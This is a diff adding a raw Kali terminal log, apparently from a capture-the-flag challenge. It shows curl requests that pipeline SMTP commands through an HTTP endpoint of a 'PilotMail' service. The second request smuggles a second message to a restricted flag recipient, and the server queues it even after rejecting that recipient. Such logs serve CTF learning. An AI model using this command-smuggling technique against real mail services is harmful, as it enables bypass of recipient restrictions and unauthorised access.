@@ -1,0 +1,48 @@
+┌──(root㉿kali)-[/home/kali/CTF-Tools]
+└─# curl -i -sS http://138.201.185.107:20037/v1/smtp \
+  -H 'Content-Type: application/octet-stream' \
+  --data-binary $'EHLO web\r\nMAIL FROM:<pilot@users.localhost>\r\nRCPT TO:<pilot@users.localhost>\r\nDATA\r\nhello\r\n.\r\nNOOP\r\nDELIVER LAST\r\n'
+HTTP/1.1 200 OK
+Server: PilotMail/1 Python/3.11.2
+Date: Tue, 17 Nov 2026 21:25:02 GMT
+Content-Type: application/octet-stream
+Content-Length: 63
+Cache-Control: no-store
+X-Content-Type-Options: nosniff
+
+250 quay-mail
+250
+250
+354
+250 queued
+500
+500
+250
+hello
+                                                                                                                                                                                                                                           
+┌──(root㉿kali)-[/home/kali/CTF-Tools]
+└─# curl -i -sS http://138.201.185.107:20037/v1/smtp \
+  -H 'Content-Type: application/octet-stream' \
+  --data-binary $'EHLO web\r\nMAIL FROM:<pilot@users.localhost>\r\nRCPT TO:<pilot@users.localhost>\r\nDATA\r\nhello\r\n.\r\nMAIL FROM:<pilot@users.localhost>\r\nRCPT TO:<flag@localhost>\r\nDATA\r\nflag please\r\n.\r\nDELIVER LAST\r\n'
+HTTP/1.1 200 OK
+Server: PilotMail/1 Python/3.11.2
+Date: Tue, 17 Nov 2026 21:25:24 GMT
+Content-Type: application/octet-stream
+Content-Length: 138
+Cache-Control: no-store
+X-Content-Type-Options: nosniff
+
+250 quay-mail
+250
+250
+354
+250 queued
+250
+550 That recipient is not on the pilot list.
+354
+250 queued
+500
+250
+hello
+flag please
+
